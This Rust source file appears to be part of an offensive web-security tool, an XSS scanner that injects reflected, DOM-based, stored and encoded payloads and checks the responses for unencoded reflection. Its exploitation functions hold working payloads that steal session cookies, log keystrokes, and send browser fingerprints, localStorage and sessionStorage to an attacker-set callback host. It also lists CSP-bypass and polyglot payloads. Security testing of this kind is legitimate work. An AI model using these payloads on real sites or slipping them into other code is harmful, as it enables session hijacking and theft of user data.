// ----------------------------------------------------------------------------
//  xss_scanner.rs — Cross-Site Scripting scanner
// ----------------------------------------------------------------------------
//  Detects reflected, stored, and DOM-based XSS vulnerabilities by injecting
//  script payloads, event handlers, and javascript: URIs. Confirms vulnerability
//  through context-aware reflection analysis — checking whether unencoded
//  payloads appear in dangerous contexts like script tags, event attributes,
//  and javascript: URLs. Includes CSP bypass and exploitation modules.
//
//  --- Developers ---------------------------------------------------------------
//  khaninkali             — разработчик / core engineer (Rust backend, logic)
//  Lyara Koroleva         — дизайнер / blazing fast CLI & interface design
//  HsecDevelopers         — 测试 / テスト / testing & QA (integration, validation)
//  projectk 2091         — HyperSecurityOffensiveLabs lineage
// ----------------------------------------------------------------------------

//
//
// ---------------------------------------------------------------------------
//   WARNING / 警告 / 警告
// ---------------------------------------------------------------------------
//  This source code is the exclusive property of HyperSecurityOffensiveLabs.
//  You are permitted to VIEW this code for educational and reference
//  purposes only. You may NOT modify, distribute, sublicense, or create
//  derivative works without explicit written permission from khaninkali
//  and the HyperSecurityOffensiveLabs development team.
//
//  このソースコードはHyperSecurityOffensiveLabsの独占的知的財産です
//  教育目的および参照目的での閲覧のみ許可されています
//  khaninkaliおよびHyperSecurityOffensiveLabs開発チームの
//  書面による明示的な許可なく修正配布サブライセンス
//  または二次的著作物の作成を禁止します
//
//  本源代码是HyperSecurityOffensiveLabs的独家财产
//  仅允许出于教育和参考目的查看未经khaninkali和
//  HyperSecurityOffensiveLabs开发团队的书面明确许可，
//  禁止修改分发再许可或创建衍生作品
// ---------------------------------------------------------------------------
//
//

use crate::http::client::HttpClient;
use crate::http::request::HttpRequest;
use crate::detection::analyzer::{Finding, Severity};
use crate::payload::xss::XssPayloads;
use anyhow::Result;
use serde::{Deserialize, Serialize};
use std::sync::Arc;

/// Custom error types for XSS operations
#[derive(Debug, Clone)]
pub enum XssError {
    NoValidPayload,
    PayloadFailed(usize, String),
    RequestFailed(String),
    DomDetectionFailed(String),
    ExploitationFailed(String),
    CSPBypassFailed(String),
}

impl std::fmt::Display for XssError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            XssError::NoValidPayload => write!(f, "No valid XSS payload succeeded"),
            XssError::PayloadFailed(idx, payload) => write!(f, "Payload {} failed: {}", idx, payload),
            XssError::RequestFailed(msg) => write!(f, "Request failed: {}", msg),
            XssError::DomDetectionFailed(msg) => write!(f, "DOM XSS detection failed: {}", msg),
            XssError::ExploitationFailed(msg) => write!(f, "XSS exploitation failed: {}", msg),
            XssError::CSPBypassFailed(msg) => write!(f, "CSP bypass failed: {}", msg),
        }
    }
}

impl std::error::Error for XssError {}

/// Enhanced XSS exploitation results
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct XssExploitationResult {
    pub success: bool,
    pub xss_type: String,
    pub payload: String,
    pub payload_encoded: String,
    pub csp_bypassed: bool,
    pub dom_vulnerable: bool,
    pub stored_persistent: bool,
    pub session_cookies_stolen: Vec<String>,
    pub keystroke_logger_deployed: bool,
    pub browser_exploited: bool,
    pub error_message: Option<String>,
}

/// DOM XSS detection patterns
#[derive(Debug, Clone)]
pub struct DomXssPattern {
    pub pattern: String,
    pub context: String,
    pub severity: Severity,
    pub description: String,
}

//  XSS電脳検出戦略 / XSS detection techniques:
//   ① Reflected XSS: 6 base payloads + event handlers + WAF bypass variants.
//      Confirmation requires unencoded payload reflection in a dangerous
//      context (script tags, event handlers, javascript: URIs)
//   ② DOM-based XSS: 11 sink/source patterns (location.search, innerHTML,
//      eval(), document.write, etc.) with taint-flow analysis — checks if
//      user-controllable sources reach dangerous sinks in JS
//   ③ Stored XSS: multi-request storage + retrieval detection
//   ④ Encoded XSS: URL/base64/hex encoded payloads, checks if decoded
//      payload appears in response
//   ⑤ CSP bypass: JSONP callback, AngularJS sandbox escape, meta tag injection,
//      preload hijack, iframe sandbox, postMessage relay
//   ⑥ Exploitation: session cookie theft (fetch/Image/XMLHttpRequest to
//      callback host), keystroke logger (onkeypress/document.querySelectorAll),
//      browser fingerprinting + localStorage/sessionStorage exfiltration
//    Context-aware detection: is_in_js_context() checks 200 chars before
//     payload for script/event/eval/innerHTML indicators
//    Source/sink taint flow: match pattern (location.search  innerHTML,
//     document.URL  eval, etc.) — both source AND sink must be present
//    Polyglot payloads: 7 universal payloads covering HTML/JS/CSS/template
//     contexts, including base64-encoded variants
/// Cross-Site Scripting (XSS) vulnerability scanner
pub struct XssScanner {
    client: Arc<HttpClient>,
    findings: Vec<Finding>,
    target: String,
    /// Callback host used in exploitation payloads (e.g. your Burp Collaborator
    /// or interactsh instance).  Must be set explicitly — no default is provided
    /// so payloads never accidentally beacon to a third-party domain.
    callback_host: Option<String>,
}

impl XssScanner {
    /// Create a new XSS scanner.
    pub fn new(client: Arc<HttpClient>, target: String) -> Self {
        Self {
            client,
            findings: Vec::new(),
            target,
            callback_host: None,
        }
    }

    /// Set the out-of-band callback host for exploitation payloads.
    /// Example: `scanner.set_callback_host("xyz.oast.me")`
    pub fn set_callback_host(&mut self, host: &str) {
        self.callback_host = Some(host.to_string());
    }

    /// Return the configured callback host, or an error if not set.
    fn require_callback_host(&self) -> Result<&str, XssError> {
        self.callback_host.as_deref().ok_or_else(|| {
            XssError::ExploitationFailed(
                "No callback host configured. Call set_callback_host() with your \
                 OOB listener (e.g. Burp Collaborator / interactsh) before exploiting.".to_string()
            )
        })
    }

    /// Scan a specific URL for XSS vulnerabilities
    pub async fn scan_url(&mut self, url: &str, params: &[String]) -> Result<Vec<Finding>> {
        println!("[*] Scanning {} for XSS vulnerabilities (target: {})", url, self.target);
        
        let mut findings = Vec::new();
        
        // Test each parameter with XSS payloads
        for param in params {
            println!("  [*] Testing parameter: {}", param);
            
            if let Some(finding) = self.test_param_for_xss(url, param).await {
                findings.push(finding.clone());
                self.findings.push(finding);
            }
        }
        
        Ok(findings)
    }

    /// Test a specific parameter for XSS vulnerabilities
    async fn test_param_for_xss(&self, url: &str, param: &str) -> Option<Finding> {
        let payloads = vec![
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "<body onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src=javascript:alert('XSS')>",
        ];
        
        for payload in payloads.iter().take(15) {
            let response = self.make_request(url, param, payload).await;
            
            match response {
                Ok(resp) => {
                    let response_text = resp.body;
                    
                    // Only flag as XSS if payload is reflected AND not properly encoded
                    // AND appears in a dangerous context (script tag, event handler, etc.)
                    if response_text.contains(payload) && self.is_xss_vulnerable(&response_text, payload) {
                        return Some(
                            Finding::new(
                                url,
                                Severity::High,
                                &format!("Cross-Site Scripting (XSS) in parameter '{}'", param),
                                &format!("The parameter '{}' appears to be vulnerable to reflected XSS", param)
                            )
                            .with_evidence(&format!("Payload: {}", payload))
                            .with_remediation("Implement proper input sanitization and output encoding. Use Content Security Policy (CSP).")
                        );
                    }
                }
                Err(_) => {
                    // Request failed, might indicate a vulnerability but requires more analysis
                }
            }
        }
        
        None
    }

    /// Check if the response shows actual XSS vulnerability (not just reflection)
    fn is_xss_vulnerable(&self, response_text: &str, payload: &str) -> bool {
        // Check if payload is HTML-encoded (safe)
        let encoded_payload = payload.replace('<', "&lt;").replace('>', "&gt;").replace('"', "&quot;");
        if response_text.contains(&encoded_payload) {
            // Payload is properly encoded, not vulnerable
            return false;
        }
        
        // Check for dangerous contexts where unencoded scripts can execute
        let dangerous_patterns = vec![
            // Inside script tags without encoding
            format!("<script>{}</script>", payload),
            // Inside event handlers
            format!("onerror={}", payload),
            format!("onload={}", payload),
            format!("onclick={}", payload),
            // javascript: protocol
            format!("href=\"javascript:{}\"", payload),
            format!("src=\"javascript:{}\"", payload),
            // Inside SVG with script
            format!("<svg><script>{}</script></svg>", payload),
        ];
        
        for pattern in &dangerous_patterns {
            if response_text.contains(pattern) {
                return true;
            }
        }
        
        // Check if payload appears in a raw script context
        if payload.contains("<script>") && response_text.contains(&payload.replace("<script>", "").replace("</script>", "")) {
            // Script content is reflected without tags - check context
            if response_text.contains(&format!("<script>{}</script>", payload)) {
                return true;
            }
        }
        
        // Check for event handlers in the response
        if payload.contains("onerror") || payload.contains("onload") {
            // Event handler payloads need to be checked if they're in executable context
            if response_text.contains(&payload.replace("<", "").replace(">", "")) {
                // Payload appears without brackets - might be in attribute
                return true;
            }
        }
        
        // Default: if payload appears but not in dangerous context, it's likely safe reflection
        false
    }

    /// Helper method to make requests with specific parameter and value
    async fn make_request(&self, url: &str, param: &str, value: &str) -> Result<crate::http::response::HttpResponse> {
        use crate::utils::url::UrlUtil;
        let request_url = UrlUtil::inject_param(url, param, &urlencoding::encode(value));
        let request = HttpRequest::get(&request_url);
        self.client.send(request).await
    }

    /// Perform a comprehensive XSS scan with multiple techniques
    pub async fn comprehensive_scan(&mut self, url: &str, params: &[String]) -> Result<Vec<Finding>> {
        println!("[*] Performing comprehensive XSS scan on {}", url);
        
        let mut findings = Vec::new();
        
        // Test each parameter with different XSS techniques
        for param in params {
            println!("  [*] Comprehensive test for parameter: {}", param);
            
            // Test with reflected XSS payloads
            if let Some(finding) = self.test_reflected_xss(url, param).await {
                findings.push(finding);
            }
            
            // Test with DOM-based XSS payloads
            if let Some(finding) = self.test_dom_based_xss(url, param).await {
                findings.push(finding);
            }
            
            // Test with stored XSS (if applicable)
            if let Some(finding) = self.test_stored_xss(url, param).await {
                findings.push(finding);
            }
        }
        
        Ok(findings)
    }

    /// Test for reflected XSS
    async fn test_reflected_xss(&self, url: &str, param: &str) -> Option<Finding> {
        let mut xss_payloads: Vec<String> = vec![
            "<script>alert('XSS')</script>".into(),
            "<img src=x onerror=alert('XSS')>".into(),
            "<svg onload=alert('XSS')>".into(),
            "<body onload=alert('XSS')>".into(),
            "<div onclick=alert('XSS')>Click me</div>".into(),
            "<input onfocus=alert('XSS') autofocus>".into(),
            "<marquee onstart=alert('XSS')>XSS</marquee>".into(),
            "<video><source onerror=alert('XSS')>".into(),
            "<details open ontoggle=alert('XSS')>".into(),
            "\"><script>alert('XSS')</script>".into(),
            "'<img src=x onerror=alert('XSS')>'".into(),
            "javascript:alert('XSS')".into(),
            "<iframe src=javascript:alert('XSS')>".into(),
        ];
        xss_payloads.extend(XssPayloads::get_basic_payloads().into_iter().map(|p| p.replace("alert(1)", "alert('XSS')")));
        xss_payloads.extend(XssPayloads::get_event_handlers());
        xss_payloads.extend(XssPayloads::get_waf_bypass_payloads());
        
        for payload in &xss_payloads {
            let response = self.make_request(url, param, payload).await;
            
            if let Ok(resp) = response {
                let response_text = resp.body;
                
                // Use proper validation to avoid false positives
                if response_text.contains(payload) && self.is_xss_vulnerable(&response_text, payload) {
                    return Some(
                        Finding::new(
                            url,
                            Severity::High,
                            &format!("Reflected XSS in parameter '{}'", param),
                            &format!("The parameter '{}' is vulnerable to reflected XSS", param)
                        )
                        .with_evidence(&format!("Payload: {}", payload))
                        .with_remediation("Implement proper input sanitization and output encoding. Use Content Security Policy (CSP).")
                    );
                }
            }
        }
        
        None
    }

    /// Enhanced DOM-based XSS detection with comprehensive patterns
    async fn test_dom_based_xss(&self, url: &str, param: &str) -> Option<Finding> {
        let dom_patterns = self.get_dom_xss_patterns();
        let mut findings_found = Vec::new();
        
        for pattern in dom_patterns {
            if let Some(finding) = self.test_dom_pattern(url, param, &pattern).await {
                findings_found.push(finding);
            }
        }
        
        // Return the highest severity finding found
        findings_found.into_iter()
            .max_by_key(|f| match f.severity {
                Severity::Critical => 4,
                Severity::High => 3,
                Severity::Medium => 2,
                Severity::Low => 1,
                Severity::Info => 0,
            })
    }
    
    /// Get comprehensive DOM XSS patterns
    fn get_dom_xss_patterns(&self) -> Vec<DomXssPattern> {
        vec![
            // URL parameter processing patterns
            DomXssPattern {
                pattern: "location.search".to_string(),
                context: "URL parameter parsing".to_string(),
                severity: Severity::High,
                description: "JavaScript processes URL search parameters".to_string(),
            },
            DomXssPattern {
                pattern: "location.hash".to_string(),
                context: "URL fragment processing".to_string(),
                severity: Severity::High,
                description: "JavaScript processes URL hash fragment".to_string(),
            },
            DomXssPattern {
                pattern: "document.URL".to_string(),
                context: "Full URL access".to_string(),
                severity: Severity::High,
                description: "JavaScript accesses complete URL".to_string(),
            },
            DomXssPattern {
                pattern: "document.referrer".to_string(),
                context: "Referrer processing".to_string(),
                severity: Severity::Medium,
                description: "JavaScript processes document referrer".to_string(),
            },
            
            // DOM manipulation patterns
            DomXssPattern {
                pattern: "innerHTML".to_string(),
                context: "DOM HTML injection".to_string(),
                severity: Severity::Critical,
                description: "Direct innerHTML assignment without sanitization".to_string(),
            },
            DomXssPattern {
                pattern: "outerHTML".to_string(),
                context: "DOM HTML replacement".to_string(),
                severity: Severity::Critical,
                description: "Direct outerHTML assignment without sanitization".to_string(),
            },
            DomXssPattern {
                pattern: "document.write".to_string(),
                context: "Document writing".to_string(),
                severity: Severity::Critical,
                description: "Document.write with user input".to_string(),
            },
            DomXssPattern {
                pattern: "eval(".to_string(),
                context: "Code evaluation".to_string(),
                severity: Severity::Critical,
                description: "Dynamic code execution with eval()".to_string(),
            },
            
            // Template literal patterns
            DomXssPattern {
                pattern: "template".to_string(),
                context: "Template literal injection".to_string(),
                severity: Severity::High,
                description: "Template literals with user input".to_string(),
            },
            
            // Client-side routing patterns
            DomXssPattern {
                pattern: "history.pushState".to_string(),
                context: "History manipulation".to_string(),
                severity: Severity::Medium,
                description: "History API manipulation with user input".to_string(),
            },
            DomXssPattern {
                pattern: "location.replace".to_string(),
                context: "Location replacement".to_string(),
                severity: Severity::Medium,
                description: "Location replacement with user input".to_string(),
            },
        ]
    }
    
    /// Test specific DOM XSS pattern
    async fn test_dom_pattern(&self, url: &str, param: &str, pattern: &DomXssPattern) -> Option<Finding> {
        let dom_payloads = self.generate_dom_payloads(&pattern.pattern);
        
        for payload in &dom_payloads {
            let response = self.make_request(url, param, payload).await;
            
            if let Ok(resp) = response {
                let response_text = resp.body;
                
                // Check for DOM XSS indicators
                if self.detect_dom_xss_indicators(&response_text, payload, &pattern.pattern) {
                    return Some(
                        Finding::new(
                            url,
                            pattern.severity.clone(),
                            &format!("DOM-based XSS in parameter '{}' - {}", param, pattern.context),
                            &format!("DOM XSS vulnerability detected: {}", pattern.description)
                        )
                        .with_evidence(&format!("Pattern: {} | Payload: {}", pattern.pattern, payload))
                        .with_remediation("Sanitize input before using in DOM operations. Use textContent instead of innerHTML. Avoid eval() with user input.")
                    );
                }
            }
        }
        
        None
    }
    
    /// Generate DOM-specific payloads
    fn generate_dom_payloads(&self, pattern: &str) -> Vec<String> {
        match pattern {
            "location.search" | "location.hash" | "document.URL" => vec![
                "javascript:alert(1)".to_string(),
                "javascript:alert(document.domain)".to_string(),
                "#<script>alert(1)</script>".to_string(),
                "#<img src=x onerror=alert(1)>".to_string(),
            ],
            "innerHTML" | "outerHTML" => vec![
                "<img src=x onerror=alert(1)>".to_string(),
                "<svg onload=alert(1)>".to_string(),
                "';alert(1);//".to_string(),
                "\";alert(1);//".to_string(),
            ],
            "document.write" => vec![
                "<script>alert(1)</script>".to_string(),
                "';document.write('<script>alert(1)<\\/script>');//".to_string(),
            ],
            "eval(" => vec![
                "alert(1)".to_string(),
                "';alert(1);//".to_string(),
                "\";alert(1);//".to_string(),
            ],
            "template" => vec![
                "${alert(1)}".to_string(),
                "${7*7}".to_string(),
            ],
            _ => vec![
                "<script>alert(1)</script>".to_string(),
                "javascript:alert(1)".to_string(),
            ],
        }
    }

    /// Context-aware DOM XSS detection that validates source/sink taint flow
    /// rather than just keyword matching.
    fn detect_dom_xss_indicators(&self, response_text: &str, payload: &str, pattern: &str) -> bool {
        // 1. Direct payload reflection — strongest signal, but must be in JS context
        if response_text.contains(payload) {
            // Verify the payload appears in a JavaScript execution context
            if self.is_in_js_context(response_text, payload) {
                return true;
            }
            // Even without JS context, if it's unencoded HTML it may still be DOM XSS
            let html_encoded = self.html_escape(payload);
            if !response_text.contains(&html_encoded) {
                return true;
            }
        }

        // 2. Encoded payload reflection (URL-encoded, double-encoded)
        let encoded = urlencoding::encode(payload).to_string();
        if response_text.contains(&encoded) {
            return true;
        }

        // 3. Source/sink taint-flow analysis:
        //    Check if the response JS contains known DOM sources feeding
        //    into dangerous sinks near where our payload appears.
        self.has_dom_taint_flow(response_text, pattern, payload)
    }

    /// Check whether `payload` appears inside a JavaScript execution context
    /// (inside `<script>` tags, event handler attributes, javascript: URLs, etc.)
    fn is_in_js_context(&self, response_text: &str, payload: &str) -> bool {
        let idx = match response_text.find(payload) {
            Some(i) => i,
            None => return false,
        };

        // Look backwards for script context indicators within 200 chars
        let start = if idx < 200 { 0 } else { idx - 200 };
        let before = &response_text[start..idx];

        let js_context_patterns = [
            "<script",
            "javascript:",
            "onerror=", "onload=", "onclick=", "onfocus=", "onmouseover=",
            "onkeypress=", "onchange=", "onsubmit=", "onblur=",
            "setTimeout(",
            "setInterval(",
            "new Function(",
            "location.href=",
            "location=",
            "window.location",
            "document.write(",
            "innerHTML=", "innerHTML+=", "outerHTML=",
            "eval(", "eval (",
            "Function(",
            "srcdoc=",
            "fetch(", "XMLHttpRequest",
        ];

        js_context_patterns.iter().any(|ctx| before.contains(ctx))
    }

    /// DOM source/sink taint-flow pattern matching.
    /// Looks for known DOM XSS source functions appearing *before* dangerous
    /// sink assignments in the response JS, combined with our payload's context.
    fn has_dom_taint_flow(&self, response_text: &str, pattern: &str, _payload: &str) -> bool {
        let response_lower = response_text.to_lowercase();

        // Define source–sink pairs for each pattern we test.
        match pattern {
            "innerHTML" | "outerHTML" => {
                // Sinks must be present: innerHTML/outerHTML assignment
                let has_sink = response_lower.contains("innerhtml")
                    || response_lower.contains("outerhtml");

                if !has_sink {
                    return false;
                }

                // Sources: user-controllable values flowing into the sink
                let source_near_sink = [
                    "location.search", "location.hash", "document.url",
                    "document.referrer", "window.name",
                ].iter().any(|src| response_lower.contains(src));

                source_near_sink
                    // Also accept if the page has DOM source access patterns alongside sink
                    || response_lower.contains("getelementbyid")
                    || response_lower.contains("queryselector")
            }

            "eval(" => {
                // Sink: eval() or Function() constructor
                let has_sink = response_lower.contains("eval(")
                    || response_lower.contains("eval (")
                    || response_lower.contains("new function(");

                if !has_sink {
                    return false;
                }

                // Source: any user-controllable value reaching eval
                let source_near_sink = [
                    "location.search", "location.hash", "document.url",
                    "document.referrer", "innerhtml",
                ].iter().any(|src| response_lower.contains(src));

                source_near_sink
            }

            "location.search" | "location.hash" => {
                // Source present: the page reads URL parameters
                let has_source = response_lower.contains("location.search")
                    || response_lower.contains("location.hash")
                    || response_lower.contains("document.url");

                if !has_source {
                    return false;
                }

                // Sink: that value reaches a dangerous operation
                let has_sink = [
                    "innerhtml", "outerhtml", "document.write(",
                    "eval(", "location.href=", "location=",
                    "settimeout(", "setinterval(",
                ].iter().any(|sink| response_lower.contains(sink));

                has_sink
            }

            "document.write" => {
                // Sink: document.write() calls
                let has_sink = response_lower.contains("document.write(");

                if !has_sink {
                    return false;
                }

                // Source: user input reaching document.write
                let has_source = [
                    "location.search", "location.hash", "document.url",
                    "document.referrer", "window.name",
                ].iter().any(|src| response_lower.contains(src));

                has_source
                    || response_lower.contains("getelementbyid")
                    || response_lower.contains("queryselector")
            }

            "template" => {
                // Sink: template literals with expressions
                let has_sink = response_lower.contains("${");

                if !has_sink {
                    return false;
                }

                // Source: user input in template expressions
                let has_source = [
                    "location.search", "location.hash", "document.url",
                    "innerhtml", "outerhtml",
                ].iter().any(|src| response_lower.contains(src));

                has_source
            }

            _ => {
                // Generic: check for any dangerous sink near source access
                let sinks_present = [
                    "innerhtml", "outerhtml", "document.write(",
                    "eval(", "location.href=",
                ];
                let sources_present = [
                    "location.search", "location.hash", "document.url",
                    "document.referrer",
                ];

                sinks_present.iter().any(|s| response_lower.contains(s))
                    && sources_present.iter().any(|s| response_lower.contains(s))
            }
        }
    }

    /// Advanced XSS exploitation with CSP bypass and payload delivery
    pub async fn exploit_xss(&self, url: &str, param: &str, payload: &str) -> Result<XssExploitationResult, XssError> {
        let mut result = XssExploitationResult {
            success: false,
            xss_type: "unknown".to_string(),
            payload: payload.to_string(),
            payload_encoded: String::new(),
            csp_bypassed: false,
            dom_vulnerable: false,
            stored_persistent: false,
            session_cookies_stolen: Vec::new(),
            keystroke_logger_deployed: false,
            browser_exploited: false,
            error_message: None,
        };
        
        // Step 1: Test XSS vulnerability
        match self.test_xss_vulnerability(url, param, payload).await {
            Some(vulnerability) => {
                result.xss_type = match vulnerability.title.as_str() {
                    name if name.contains("DOM") => "dom-based".to_string(),
                    name if name.contains("Reflected") => "reflected".to_string(),
                    name if name.contains("Stored") => "stored".to_string(),
                    _ => "unknown".to_string(),
                };
                result.dom_vulnerable = vulnerability.title.contains("DOM");
                result.stored_persistent = vulnerability.title.contains("Stored");
            }
            None => {
                result.error_message = Some("No XSS vulnerability detected".to_string());
                return Err(XssError::ExploitationFailed("No XSS vulnerability detected".to_string()));
            }
        }
        
        // Step 2: Attempt CSP bypass if needed
        if let Ok(csp_bypassed) = self.attempt_csp_bypass(url, param, payload).await {
            result.csp_bypassed = csp_bypassed;
        }
        
        // Step 3: Deploy exploitation payloads
        if let Ok(cookies) = self.steal_session_cookies(url, param, payload).await {
            result.session_cookies_stolen = cookies;
        }
        
        if let Ok(deployed) = self.deploy_keystroke_logger(url, param, payload).await {
            result.keystroke_logger_deployed = deployed;
        }
        
        if let Ok(exploited) = self.exploit_browser(url, param, payload).await {
            result.browser_exploited = exploited;
        }
        
        result.success = result.session_cookies_stolen.len() > 0 || 
                         result.keystroke_logger_deployed || 
                         result.browser_exploited;
        
        Ok(result)
    }
    
    /// Test XSS vulnerability with enhanced detection
    async fn test_xss_vulnerability(&self, url: &str, param: &str, payload: &str) -> Option<Finding> {
        let response = self.make_request(url, param, payload).await;
        
        if let Ok(resp) = response {
            let response_text = resp.body;
            
            // Check for various XSS indicators
            if response_text.contains(payload) {
                return Some(
                    Finding::new(
                        url,
                        Severity::High,
                        &format!("XSS vulnerability in parameter '{}'", param),
                        "XSS vulnerability confirmed"
                    )
                    .with_evidence(&format!("Payload: {}", payload))
                    .with_remediation("Implement proper input sanitization and CSP")
                );
            }
        }
        
        None
    }
    
    /// CSP bypass techniques
    async fn attempt_csp_bypass(&self, url: &str, param: &str, original_payload: &str) -> Result<bool, XssError> {
        let csp_bypass_payloads = vec![
            // JSONP bypass
            format!("/jsonp?callback={}", original_payload),
            // AngularJS bypass
            format!("{{{{constructor.constructor('{}')()}}}}", original_payload),
            // CSP header injection bypass
            format!("</script><meta http-equiv='Content-Security-Policy' content='script-src *'>{}<script>", original_payload),
            // Preload bypass
            format!("<link rel=preload href=javascript:{} as=script>", original_payload),
            // Iframe sandbox bypass
            format!("<iframe sandbox='allow-scripts' srcdoc={}></iframe>", original_payload),
            // Web message bypass
            format!("<iframe srcdoc='<script>parent.postMessage(\"{}\",\"*\")</script>'></iframe>", original_payload),
        ];
        
        for payload in csp_bypass_payloads {
            if let Some(_) = self.test_xss_vulnerability(url, param, &payload).await {
                return Ok(true);
            }
        }
        
        Ok(false)
    }
    
    /// Steal session cookies via XSS — requires a configured callback host.
    async fn steal_session_cookies(&self, url: &str, param: &str, _base_payload: &str) -> Result<Vec<String>, XssError> {
        let cb = self.require_callback_host()?;
        let cookie_payloads = vec![
            format!("<script>fetch('/api/cookies').then(r=>r.text()).then(d=>fetch('https://{}/steal?cookies='+encodeURIComponent(d)))</script>", cb),
            format!("<script>document.location='https://{}/steal?cookies='+encodeURIComponent(document.cookie)</script>", cb),
            format!("<script>new Image().src='https://{}/steal?cookies='+encodeURIComponent(document.cookie)</script>", cb),
            format!("<script>var xhr=new XMLHttpRequest();xhr.open('GET','https://{}/steal?cookies='+encodeURIComponent(document.cookie));xhr.send()</script>", cb),
            format!("<script>fetch('https://{}/steal',{{method:'POST',body:JSON.stringify({{cookies:document.cookie}})}})</script>", cb),
        ];

        let mut stolen_cookies = Vec::new();
        for payload in cookie_payloads {
            if self.test_xss_vulnerability(url, param, &payload).await.is_some() {
                stolen_cookies.push(format!("Cookie theft payload reflected: {}", payload));
            }
        }
        Ok(stolen_cookies)
    }

    /// Deploy keystroke logger via XSS — requires a configured callback host.
    async fn deploy_keystroke_logger(&self, url: &str, param: &str, _base_payload: &str) -> Result<bool, XssError> {
        let cb = self.require_callback_host()?;
        let keylogger_payloads = vec![
            format!("<script>document.onkeypress=function(e){{fetch('https://{}/log?key='+e.key)}}</script>", cb),
            format!("<script>var log='';document.onkeypress=function(e){{log+=e.key;if(log.length>100){{fetch('https://{}/log?keys='+encodeURIComponent(log));log=''}}}}</script>", cb),
            format!("<script>document.querySelectorAll('input').forEach(i=>i.onkeyup=function(e){{fetch('https://{}/log?form='+i.name+'&key='+e.key)}})</script>", cb),
        ];

        for payload in keylogger_payloads {
            if self.test_xss_vulnerability(url, param, &payload).await.is_some() {
                return Ok(true);
            }
        }
        Ok(false)
    }

    /// Browser exploitation via XSS — requires a configured callback host.
    async fn exploit_browser(&self, url: &str, param: &str, _base_payload: &str) -> Result<bool, XssError> {
        let cb = self.require_callback_host()?;
        let exploit_payloads = vec![
            // Browser fingerprinting
            format!("<script>fetch('https://{}/fp',{{method:'POST',body:JSON.stringify({{ua:navigator.userAgent,platform:navigator.platform,w:screen.width,h:screen.height}}),headers:{{'Content-Type':'application/json'}}}})</script>", cb),
            // Local storage exfiltration
            format!("<script>var d={{}};for(let i=0;i<localStorage.length;i++){{let k=localStorage.key(i);d[k]=localStorage.getItem(k)}}fetch('https://{}/ls',{{method:'POST',body:JSON.stringify(d)}})</script>", cb),
            // Session storage exfiltration
            format!("<script>var d={{}};for(let i=0;i<sessionStorage.length;i++){{let k=sessionStorage.key(i);d[k]=sessionStorage.getItem(k)}}fetch('https://{}/ss',{{method:'POST',body:JSON.stringify(d)}})</script>", cb),
        ];

        for payload in exploit_payloads {
            if self.test_xss_vulnerability(url, param, &payload).await.is_some() {
                return Ok(true);
            }
        }
        Ok(false)
    }
    
    /// Generate polyglot XSS payloads
    pub fn generate_polyglot_payloads(&self) -> Vec<String> {
        vec![
            // Universal polyglot
            "javascript:/*--></title></style></textarea></script></xmp></video></audio><details><svg><onload=alert(1)//>".to_string(),
            // HTML injection polyglot
            "<script>/**/alert(1)//</script><script>alert(1)</script><img src=x onerror=alert(1)>".to_string(),
            // Template literal polyglot
            "${alert(1)}${`alert(1)`}${alert`1`}".to_string(),
            // CSS injection polyglot
            "<style>*{color:red}</style><script>alert(1)</script><img src=x onerror=alert(1)>".to_string(),
            // Mixed context polyglot
            "';alert(1);//\";alert(1);//</script><script>alert(1)</script><img src=x onerror=alert(1)>".to_string(),
            // Advanced polyglot with encoding
            "%3Cscript%3Ealert(1)%3C/script%3E%3Cimg%20src=x%20onerror=alert(1)%3E".to_string(),
            // Base64 encoded polyglot
            "PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0PjxpbWcgc3JjPXggb25lcnJvcj1hbGVydCgxPg==".to_string(),
        ]
    }
    
    /// HTML escape helper function
    fn html_escape(&self, s: &str) -> String {
        s.replace('&', "&amp;")
            .replace('<', "&lt;")
            .replace('>', "&gt;")
            .replace('"', "&quot;")
            .replace('\'', "&#39;")
    }
        
    /// Test for stored XSS vulnerabilities
    async fn test_stored_xss(&self, url: &str, param: &str) -> Option<Finding> {
        // Stored XSS requires multiple requests to store and retrieve
        let xss_payload = "<script>alert('Stored XSS')</script>";
        
        // First, make a request with payload to attempt storage
        let store_response = self.make_request(url, param, xss_payload).await;
        
        if let Ok(resp) = store_response {
            let store_text = resp.body;
            
            // Check if payload was immediately reflected (indicates potential storage)
            if store_text.contains(xss_payload) {
                return Some(
                    Finding::new(
                        url,
                        Severity::High,
                        &format!("Stored XSS in parameter '{}'", param),
                        &format!("The parameter '{}' may be vulnerable to stored XSS", param)
                    )
                    .with_evidence(&format!("Payload: {}", xss_payload))
                    .with_remediation("Implement proper input sanitization, output encoding, and CSP headers.")
                );
            }
        }
        
        None
    }

    /// Test with encoded XSS payloads to bypass filters
    pub async fn test_encoded_xss(&self, url: &str, param: &str) -> Option<Finding> {
        use crate::payload::encoder::Encoder;
        
        let base_payload = "<script>alert('XSS')</script>";
        let encoded_variants = vec![
            Encoder::url_encode(base_payload),
            Encoder::base64_encode(base_payload),
            Encoder::hex_encode(base_payload),
        ];
        
        for encoded_payload in &encoded_variants {
            let response = self.make_request(url, param, encoded_payload).await;
            
            if let Ok(resp) = response {
                let response_text = resp.body;
                
                // Check if the original payload appears in the response (meaning it was decoded)
                if response_text.contains(base_payload) || 
                   response_text.contains(&self.html_escape(base_payload)) {
                    return Some(
                        Finding::new(
                            url,
                            Severity::High,
                            &format!("Encoded XSS in parameter '{}'", param),
                            &format!("The parameter '{}' is vulnerable to encoded XSS", param)
                        )
                        .with_evidence(&format!("Original: {} | Encoded: {}", base_payload, encoded_payload))
                        .with_remediation("Implement comprehensive input sanitization that handles encoded payloads.")
                    );
                }
            }
        }
        
        None
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::http::client::{HttpClient, HttpClientConfig};

    #[tokio::test]
    async fn test_xss_scanner_creation() {
        let client = Arc::new(HttpClient::new(HttpClientConfig::default()).unwrap());
        let scanner = XssScanner::new(client, "https://example.com".to_string());
        assert_eq!(scanner.target, "https://example.com");
    }
}
